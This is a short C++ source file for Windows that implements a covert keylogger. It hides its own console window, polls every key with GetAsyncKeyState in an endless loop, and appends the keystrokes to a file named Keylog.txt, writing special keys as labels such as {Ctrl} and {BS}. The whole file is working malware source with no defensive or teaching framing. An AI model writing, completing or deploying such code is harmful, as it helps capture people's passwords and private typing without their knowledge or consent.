#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>

void Logging(std::string file, int key);

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	std::string logfile = "Keylog.txt";

	while(1) {
		for(int i=VK_BACK; i<=VK_OEM_CLEAR; i++) {
			if(GetAsyncKeyState(i) == -32767) Logging(logfile, i);
		}
	}

	return 0;
}

void Logging(std::string file, int key) {
	std::ofstream ofs(file, std::ios::app);

	switch(key) {
	case VK_RETURN:
		ofs << std::endl;
		break;
	case VK_CONTROL:
		ofs << "{Ctrl}";
		break;
	case VK_MENU:
		ofs << "{Alt}";
		break;
	case VK_SHIFT:
		ofs << "{Shift}";
		break;
	case VK_BACK:
		ofs << "{BS}";
		break;
	case VK_ESCAPE:
		ofs << "{Escape}";
		break;
	default:
		if('A' <= key && 'Z' >= key) ofs << (char)(MapVirtualKey(key, 2)+('a'-'A'));	// アルファベットの時は小文字で出力
		else ofs << (char)(MapVirtualKey(key, 2));
	};
	ofs.close();
}